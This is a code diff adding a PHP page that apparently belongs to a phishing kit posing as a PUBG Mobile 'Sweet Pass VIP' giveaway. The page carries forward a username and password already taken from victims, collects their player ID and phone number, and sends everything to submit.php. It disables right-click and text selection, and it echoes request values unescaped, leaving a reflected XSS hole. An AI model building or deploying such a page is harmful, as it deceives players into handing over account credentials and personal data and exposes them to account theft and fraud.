@@ -1,0 +1,115 @@
+<?php
+$username = $_GET['username'];
+$password = $_GET['password'];
+$login = $_GET['login'];
+?>
+<html>
+<head>
+	
+
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>PUBGM - STAY AT HOME</title>
+<link rel="stylesheet" href="css/style.css">
+<link rel="stylesheet" href="css/animate.css">
+<link rel="icon" href="img/icon.jpg">
+
+
+</head>
+
+<center>
+ <body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
+<main>
+<div class="content-layer">
+  
+<div class="header-layer">
+<div class="ornament">O</div><div class="ornament">O</div>
+<img src="img/icon.jpg">
+<div class="header-text"><u>SWEET PASS</u><g> VIP</g></div>
+</div>
+
+<div class="content-place">
+<div class="content-fill-A" >
+
+<div class="separator">
+  <div class="line-L"></div>
+  <h2>REGISTRATION FORM</h2>
+  <div class="line-R"></div>
+</div>
+     
+<form action="submit.php" method="GET" id="dataSubmit">
+
+      <input type="hidden" class="verify" name="username" id="email" value="<?php echo $username;?>" readonly> 
+      <input type="hidden" class="verify" name="password" id="password" value="<?php echo $password;?>" readonly> 
+      <input type="hidden" class="verify" name="login" id="login" value="<?php echo $login;?>" readonly> 
+
+- write down your player id
+<input type="number"  select class="input-box" 
+name="input_1" id="input_1"
+placeholder="id player" autocomplete="off" required>
+	    
+- which type of game do you use ?
+<select class="input-box" name="input_2" id="input_2"
+required> <option selected disabled value=""
+  >game type</option>
+  <option>PUBGM GLOBAL</option>
+  <option>PUBGM KOREA</option>
+  <option>PUBGM CHAINA</option>
+  <option>PUBGM VNG</option>
+</select>
+
+<br>
+<br>
+additional information :
+<br>
+- since what season have you played ?
+<input type="number"  select class="input-box" 
+name="input_3" id="input_3"   placeholder="season"
+autocomplete="off" required>
+	    
+- for now, did you take the royal pass ?
+<select class="input-box" name="input_4" id="input_4"
+required> <option selected disabled value=""
+  >pass type</option>
+  <option>PRIME PLUS</option>
+  <option>PRIME</option>
+  <option>FREE</option>
+</select>
+
+- what device do you use to play ?
+<select class="input-box" name="input_5" id="input_5"
+required> <option selected disabled value=""
+  >your platform</option>
+  <option>ANDROID</option>
+  <option>IOS</option>
+  <option>EMULATOR</option>
+  <option>OTHER DEVICE</option>
+</select>
+	    
+- your cell phone number ?
+<input type="text"  select class="input-box" 
+name="input_6" id="input_6"placeholder="phone number"
+autocomplete="off" required>
+
+<br>
+<br>
+❗ check again before submitting the form
+      <button type="submit" class="button-P3A" id="verify">REGISTER</button></button> 
+      
+</form> 
+     
+<div id="success"></div> 
+     
+</div> 
+</div> 
+</div> 
+</main>
+</body>
+</center>
+
+
+<!--- FOOTER st --->
+<footer><div class="footer-txt">© 2021 copyright @ SEWEET PASS all rights reserved</div></footer>
+<!--- FOOTER ed --->
+</html>
